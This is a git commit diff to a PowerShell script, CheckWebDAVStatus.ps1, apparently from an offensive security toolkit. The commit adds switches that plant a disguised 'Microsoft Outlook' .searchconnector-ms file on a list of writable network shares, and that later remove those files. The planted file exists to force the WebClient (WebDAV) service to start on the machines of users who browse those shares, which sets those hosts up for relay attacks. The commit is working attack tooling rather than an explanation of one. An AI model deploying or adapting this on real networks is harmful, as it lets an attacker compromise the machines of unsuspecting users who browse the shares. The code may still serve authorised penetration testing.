7891720a3c9752bc9fda9de5742e6be11f3b957d
Rob <61951374+Leo4j@users.noreply.github.com>
2023-09-25 11:23:09 +0100

    Update CheckWebDAVStatus.ps1

--- CheckWebDAVStatus.ps1
+++ CheckWebDAVStatus.ps1
@@ -53,7 +53,19 @@ function CheckWebDAVStatus
 		
 	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
         [switch]
-        $NoPortScan
+        $NoPortScan,
+		
+	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
+        [switch]
+        $Enable,
+		
+	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
+        [switch]
+        $Disable,
+		
+	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
+        [String]
+        $WritableShares
 
  	)
 
@@ -161,11 +173,80 @@ function CheckWebDAVStatus
 			$WebDAVStatusEnabled = ($WebDAVStatusEnabled -join ',')
 			Invoke-SessionHunter -Targets $WebDAVStatusEnabled -NoPortScan
 		}
-	 }
+	}
 	
-	 else{
+	else{
 		Write-Output ""
-	 	Write-Output " No hosts found where the WebClient Service is active."
-	  	Write-Output ""
-	  }
+		Write-Output " No hosts found where the WebClient Service is active."
+		Write-Output ""
+	}
+	
+	if($Enable -AND $WritableShares){
+		Write-Host " WebDAV file attack in progress..."
+		Write-Host ""
+		
+		$WebDavFile = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://whatever/</url>
+    </simpleLocation>
+</searchConnectorDescription>
+"@
+		$WebDavFileName = "about.searchconnector-ms"
+		
+		$sharesvariable = Get-Content $WritableShares
+		
+		foreach ($share in $sharesvariable) {
+			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
+			try {
+				Set-Content -Path $fullPath -Value $WebDavFile -Force
+				Write-Output " File saved to: $fullPath"
+			} catch {
+				Write-Warning " Failed to save file to: $fullPath"
+			}
+		}
+	}
+	
+	elseif($Enable -AND !$WritableShares){
+		Write-Output " Please provide a file containing a list of writable shares"
+		Write-Output ""
+		break
+	}
+	
+	if($Disable -AND $WritableShares){
+		Write-Host " File deletion in progress..."
+		Write-Host ""
+		$WebDavFileName = "about.searchconnector-ms"
+		$sharesvariable = Get-Content $WritableShares
+		
+		foreach ($share in $sharesvariable) {
+			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
+			if (Test-Path $fullPath) {
+				try {
+					Remove-Item -Path $fullPath -Force
+					Write-Output " File deleted from: $fullPath"
+				} catch {
+					Write-Warning " Failed to delete file from: $fullPath"
+				}
+			} else {
+				Write-Warning " File not found at: $fullPath"
+			}
+		}
+		
+	}
+	
+	elseif($Disable -AND !$WritableShares){
+		Write-Output " Please provide a file containing a list of writable shares"
+		Write-Output ""
+		break
+	}
+	
+	Write-Output ""
 }
